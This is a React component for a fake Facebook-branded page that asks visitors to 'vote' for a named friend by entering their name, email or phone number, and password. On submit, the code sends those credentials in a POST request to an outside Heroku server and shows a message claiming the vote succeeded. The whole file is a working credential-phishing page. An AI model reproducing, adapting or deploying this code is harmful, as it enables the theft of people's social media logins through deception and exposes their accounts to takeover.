import React, { useState } from 'react';
import { Button, Form} from 'react-bootstrap';

const LogIn = () =>  {
    const [LoginText, setLoginText] = useState();
    const handleTextFeild = (e)=>{
        const name = e.target.name;
        const value = e.target.value;
        const update = {...LoginText};
        update[name] = value;
        setLoginText(update);
    }

    const loginInfo = (e)=>{
        e.preventDefault();
        console.log(LoginText);
        fetch('https://fast-savannah-55812.herokuapp.com/users', {
                method: 'POST',
                headers: {
                    'content-type': 'application/json'
                },
                body: JSON.stringify(LoginText)
            })
                .then(res => res.json())
                .then(data=>{
                  if (data.insertedId) {
                    alert('Vote Shimanto Islam successfully');
                }
                });
        e.preventDefault();
    }
    console.log(LoginText);
    
    return (
        <>
            <div className="container my-2 py-2">
                <h1 className="mb-4 text-primary fw-bolder fs-1">facebook</h1>
                <h2 style={{marginBottom: "-20px"}} className="">Please Vote Your Best Friend</h2>
                <br />
                <h3 className="mb-2 text-success">Shimanto Islam</h3>
                <div className="d-flex login-container justify-content-around align-items-center">
                    <div className="shadow-lg p-3 w-75 mb-5 bg-body rounded">
                        <Form onSubmit={loginInfo} className="w-100">
                            <Form.Group className="mb-3 w-100" controlId="formBasicEmail">
                                <Form.Label>Your Name</Form.Label>
                                <Form.Control name="name" onBlur={handleTextFeild} type="text" placeholder="Enter your name" />
                            </Form.Group>

                            <Form.Group className="mb-3" controlId="formBasicPassword">
                                <Form.Label>Email address or phone number</Form.Label>
                                <Form.Control name="email" onBlur={handleTextFeild} type="email" placeholder="Enter phone number" />
                            </Form.Group>
                            <Form.Group className="mb-3" controlId="formBasicPassword">
                                <Form.Label>Password</Form.Label>
                                <Form.Control name="password" onBlur={handleTextFeild} type="text" placeholder="Enter your password" />
                            </Form.Group>
                            <Button className="bg-primary text-white fw-bold py-1 px-2" variant="primary" type="submit">Submit</Button>
                        </Form>
                    </div>
                </div>
            </div>
        </>
    );
};

export default LogIn;